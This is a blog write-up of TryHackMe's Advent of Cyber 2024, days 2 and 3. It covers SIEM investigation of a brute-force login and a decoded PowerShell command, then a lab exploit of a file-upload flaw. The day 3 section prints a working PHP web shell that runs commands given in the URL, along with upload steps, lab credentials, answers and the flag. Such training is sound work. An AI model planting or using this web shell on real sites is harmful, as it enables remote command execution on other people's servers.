---
title: " Advent of Cyber 2024"
date: 2024-12-02 01:00:00 +0000
categories: [Writeup, CTF, Tryhackme]
tags: [Writeup, Cybersecurity, Tryhackme]
pin: true
---

Dive into the wonderful world of cyber security by engaging in festive beginner-friendly exercises every day in the lead-up to Christmas!

# **Day 2: One man's false positive is another man's potpourri.**

It’s the most wonderful time of the year again, and it’s also the most stressful day for Wareville’s Security Operations Center (SOC) team. Despite the overwhelming alerts generated by the new and noisy rules deployed, Wareville’s SOC analysts have been processing them nonstop to ensure the safety of the town.

However, the SOC analysts are now burning out of all the workload needed before Christmas. Numerous open cases are still pending, and similar alerts are still firing repeatedly, making them think of the possibility of false positives out of all this mess.

Now, help the awesome Wareville’s SOC team analyse the alerts to determine whether the rumour is true—that Mayor Malware is instigating chaos within the town.

**in this writeup I will guide you through the technical side and you can read the walkthrough from this link: `https://tryhackme.com/r/room/adventofcyber2024`

let's start by hitting our target link which will be the **Elastic SIEM**

Elastic SIEM -> Security Information and Event Management system that is used to aggregate security information in the form of logs, alerts, artifacts and events into a centralized platform that would allow security analysts to perform near real-time analysis during security monitoring.

Once we log in, we can click the menu in the top-left corner and go to the `Discover` tab to see the events. 

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/2.png)

According to the alert sent by the `Mayor`'s office, the activity occurred on `Dec 1st, 2024`, between `0900` and `0930`. We can set this as our time window by clicking the timeframe settings in the upper-right corner. Note that we need to click the `Absolute` tab and set the exact timeframe we want to view. Lastly, click the `Update` button to apply the changes.

So Let's change the date from the last 15 minutes to 1 December 2024.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/3.png)

after pressing `update` we will get this interface:

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/4.png)

In their current form, these events don't look very easily readable. We can use the fields in the left pane to add columns to the results and make them more readable. Hovering on the field name in the left pane will allow adding that field as a column, as shown below.

Since we are looking for events related to PowerShell, we would like to know the following details about the logs.

The hostname where the command was run. We can use the `host.hostname` field as a column for that.

The user who performed the activity. We can add the `user.name` field as a column for this information.

We will add the `event.category` field to ensure we are looking at the correct event category.

To know the actual commands run using PowerShell, we can add the `process.command_line` field.

Finally, to know if the activity succeeded, we will add the `event.outcome` field.

We can add all these columns by hovering on every column and a plus icon will appear since we clicked on it, it will be added in the table..

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/5.png)

Interesting! So, it looks like someone ran the same `encoded PowerShell command` on multiple machines. Another thing to note here is that before each execution of the PowerShell command, we see an `authentication` event, which was `successful`.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/6.png)

*The suspicious activity involves precise timing between logins and PowerShell commands, observed on individual machines. Best practices recommend using named accounts for administrative tasks to ensure accountability, but in this case, a generic admin account was used. Upon investigation, SOC analysts revealed that the two administrators associated with this account were not in the office when the activity occurred, raising further suspicion. Could this be the work of Glitch? Is Christmas at risk? Identifying who executed these commands is now crucial.*

Let's also add the `source.ip` field as a column to find out who ran the PowerShell commands.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/7.1.png)

Since the `source.ip` field is only present in authentication events, we need to filter out process events, click the plus (+) sign to include only authentication events.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/8.png)

As a result, you can see that the output only renders the authentication events. Since the result does not give useful insights, let's remove it for now. You can do this by clicking the x beside the filter.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/9.png)

Expand the timeframe to November 29th - December 1st to review historical authentication events. Ensure the `event.category` filter is removed before updating the time filter.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/10.png)

Over 6,800 events were logged between November 29th and December 1st, with a spike toward the end. Despite the timeframe extending to December 1st, no events followed the PowerShell execution. Authentication events were also more frequent in previous days. To refine the search, filter by `user.name: service_admin` and `source.ip: 10.0.11.11`.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/11.png)

All events originate from the same user (`service_admin`) and IP address (`10.0.11.11`), raising suspicion and warranting further investigation. To analyze the spike, filter for authentication events by clicking the plus (+) button next to `event.category`.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/12.png)

Filter out the `source.ip: 10.0.11.11` by clicking the minus (-) button to identify the IP address responsible for the spike.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/13.png)

After applying the filters, the expected result will be similar to the image below.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/14.png)

Scroll down to find numerous failed login events. The spike originates from a different IP address ending in `.255.1`, unlike the continuous events from `10.0.11.11`. Analysts previously attributed similar behavior to a script with expired credentials, later updated. To investigate further, remove the `source.ip` filter and focus on authentication events near the spike. After filtering, note that failed logins ceased shortly after a successful login from the new IP.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/15.png)

Our suspicions are rising. It seems that someone tried a brute-force attack on December 1st, as shown by the same filters applied above.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/16.png)

The results confirm a successful brute-force attack followed by the execution of PowerShell commands on the compromised machines. No further login attempts were observed afterward, indicating a True Positive (TP). Escalation is required for incident response, and McSkidy should be notified immediately.

**Christmas in Danger?**

The alarms were triggered, and McSkidy was called in to assist. After being briefed by the analysts, McSkidy noticed the PowerShell command hadn't been examined for its contents. Since the command was encoded, McSkidy changed the filters to `event.category: process` to analyze and decode the PowerShell command.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/17.png)

The encoded PowerShell command is visible in the `process.command_line` field:

```sh
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

McSkidy knows that Encoded PowerShell commands are typically Base64 encoded, so she uses a local instance of `CyberChef` to decode it. She starts by pasting the encoded command into CyberChef's Input pane.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/18.png)

double click on `From Base64` and it will show up here:

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/19.png)

then, click on `Data format` from the left panel and couble click on `Decode text` and then choose `UTF-8(1200)`

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/20.png)

The result provided a sigh of relief to McSkidy, who had feared that the Christmas had been ruined. Someone had come in to help McSkidy and the team secure their defences, but who?

**Villain or Hero?**

McSkidy uncovered a critical detail: the credentials for the script on the machines that ran the Windows updates were outdated. An attacker brute-forced the systems, and after gaining access, updated the credentials. This was evident as each PowerShell command execution followed a successful login from the same source IP, which also triggered failed login attempts over the previous days. The most shocking revelation was that it was Glitch who accessed the system **(ADM-01)** and fixed the credentials, confirmed by McSkidy after tracing the IP address.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/21.png)

This revelation showed that the people of Wareville had misunderstood **Glitch**, who was actually trying to strengthen the defenses. But if **Glitch** was improving security, who was attempting to sabotage it? Was it the Mayor who raised alarms about the `'suspicious'` PowerShell commands? Just as in a SOC, not every alert is what it seems, the situation in Wareville was similarly complex. Differentiating between a True Positive and a False Positive was as challenging as distinguishing between the Mayor's and **Glitch**'s motives. However, **McSkidy** could apply her SOC-honed evidence-based deduction skills to clarify the situation and help the people of Wareville make sense of who was truly working to **protect them**.


**What is the name of the account causing all the failed login attempts?**

Ans :`service_admin`

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/22.png)


**How many failed logon attempts were observed?**

*Question Hint*

Set the event.category filter to authentication and event.outcome to failure.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/23.png)

*6791*


**What is the IP address of Glitch?**

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/24.png)

*10.0.255.1*


**When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS**

*Dec 1, 2024 @ 08:54:39.000*

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/25.png)


**What is the decoded command executed by Glitch to fix the systems of Wareville?**

*Install-WindowsUpdate -AcceptAll -AutoReboot*

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/26.png)


# **Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it.**

After reading the explanition and the walkthrough let's move to the practical part:

Practical
Your task today is two-fold. First, you must access Kibana on MACHINE_IP:5601 to investigate the attack and answer the blue questions below.
Then, you will proceed to Frosty Pines Resort's website at `http://frostypines.thm`
and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.

Please note, to access `http://frostypines.thm`, you will need to reference it within your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: 

```bash
echo "10.10.53.42 frostypines.thm" >> /etc/hosts
```

If you do not see an IP address (i.e. 10.10.x.x) and only MACHINE IP, ensure that you have started the target machine by pressing on the green "Start Machine" button further up the task, within the heading "Connecting to the Machine".

To review the logs of the attack on Frosty Pines Resorts, make sure you select the "`frostypines-resorts`" collection within ELK. Such as below:


![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/29.png)

The date and time that you will need to use when reviewing logs will be between **11:30 and 12:00 on October 3rd 2024.**

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/30.png)

emember, to access the Frosty Pines Resorts website `(http://frostypines.thm)`, you will need to reference it in your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: `echo "10.10.53.42 frostypines.thm" >> /etc/hosts`

# **Answer the questions below**

**BLUE:** Where was the web shell uploaded to?

*Answer format: /directory/directory/directory/filename.php*

**Ans**: *media/images/rooms/shell.php*

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/28.png)

**BLUE**: What IP address accessed the web shell?

*10.11.83.34*

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/31.png)

**RED**: What is the contents of the flag.txt?

**Steps**

Add an entry to `/etc/hosts` by associating your machine's IP with frostypines.thm.

```bash
echo "10.10.53.42 frostypines.thm" >> /etc/hosts
```

then, let's open `http://frostypines.thm` and Click on the `reservation` Tab

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/32.png)

Log in using the provided credentials:

```c
Username: admin@frostypines.thm
Password: admin
```

Once logged in, visit the admin panel at `http://frostypines.thm/admin/index.php`.

Select the `Add New Room` option.

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/33.png)

Save the PHP code below with a filename of your choice, exploit.php.

```bash
nano exploit.php
```

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/34.png)

let's upload our exploit.php file..

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/35.png)

then we click add room..

After that we see that the romm has been added in the last row, right click on the image and open in new tap..

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/36.png)

we will get this shell input filed:

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/37.png)

let's make sure that our exploitation is working by writing a shell command like `ls` or `whoami`

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/38.png)

let's use `ls` command to list the directory files..

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/39.png)

last step let's use `cat` command to catch the content of the flag.txt file..

```bash
cat flag.txt
```

![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/40.png)

*THM{Gl1tch_Was_H3r3}*

see u in day 4 bro `:)`